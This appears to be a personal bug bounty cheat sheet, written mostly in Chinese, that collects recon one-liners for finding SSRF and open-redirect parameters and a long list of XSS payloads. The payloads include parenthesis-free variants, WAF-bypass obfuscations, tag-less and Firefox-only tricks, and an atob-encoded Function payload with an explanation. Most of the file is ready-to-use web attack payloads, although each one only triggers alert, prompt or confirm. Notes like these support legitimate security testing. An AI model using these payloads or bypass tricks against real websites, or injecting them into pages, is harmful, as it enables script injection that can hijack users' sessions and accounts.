# BugBountyNotes
简单记录下自己在挖掘SRC的一些技巧，备忘

#### 快速查找ssrf/open redirect

gau 目标网站 -s  | head -n 5000 > 目标.txt; cat 目标.txt | sort -u | grep -a -i \=http > redirects.txt

#### google hacking

用这个在线网站，香的不得了，输入特定域名，然后只需要点下方的按钮就行，不需要自己写dork：

![](images/pentest-tools.png)

#### 与时俱进的xss知识

执行一个字符串格式的js,在某些环境下可以用来绕过waf,不过都已经在js环境下了，绕过方法也就很多了

```
const CODE = 'alert(1)';
1. eval(CODE)
2. Function(CODE)()()
3. setTimeout(CODE)
4. document.write('<script>'+CODE+'</script>')
5. location = 'javascript:' + CODE;
6. import('data:text/javascript,' + CODE);
7. document.body.setAttribute('onclick', CODE); document.body .click();
8. []["filter"]["constructor"]( CODE )() 这个是2的变体，都是利用函数的构造函数来执行代码
```

一些不需要括号的payload:

`a=8,b=confirm,c=window,c.onerror=b;throw-a`

```
<script>
onload=setTimeout
Event.prototype.toString=
_=>"alert\501\51"
</script>
```

`<svg/onload=throw/**/Uncaught=window.onerror=eval,&quot;;alert\501\51&quot;>`

```
onhashchange=setTimeout;
HashChangeEvent.prototype.toString=
RegExp.prototype.toString;
location.hash=
HashChangeEvent.prototype.source=
'1/-alert\501\51/';
```

一些比较短的payload:
`<embed/src=//㎤.㋏>`

不知道怎么归类的payload:
`<A%09onmOuSeoVER%0a=%0aa=alert,a(document.domain)>xss`
`<a href=Javascript://%E2%80%A9alert(1)`

找到window对象支持的所有事件：

`Object.getOwnPropertyNames(window).filter(function(x){return x.startsWith('on')})`

一个只能在ff执行的xss payload，🐂：

`<script href=data:,alert(1) />`

一个不依赖标签的payload?：

`<brute contenteditable autofocus onfocus=alert(1)>`

试试能不能bypass?:

```<svg/OnLoad="`${prompt``}`">```

一种绕过思路：

https://blog.isec.pl/xss-fun-with-animated-svg/


看看这个：

alert(1) obfuscation by 
@aemkei
 
Object.values(this)[145].call(this, +!0);

Note from the author: This works in Chrome 80 but the index (145) of "alert" in windows might be different in other versions or browsers.

牛逼的payload:

```
Function`$${atob`YWxlcnQoMSk=`}```

解释：

Here is a quick explanation:

atob`YWxlcnQoMSk=`
// decodes to string to:
// "alert(1)"

`$${"alert(1)"}`
// results in the tag components:
// ["$", ""], "alert(1)" 

Function(["$", ""], "alert(1)")
// creates an anonymous function
// function($,) {alert(1)}s
```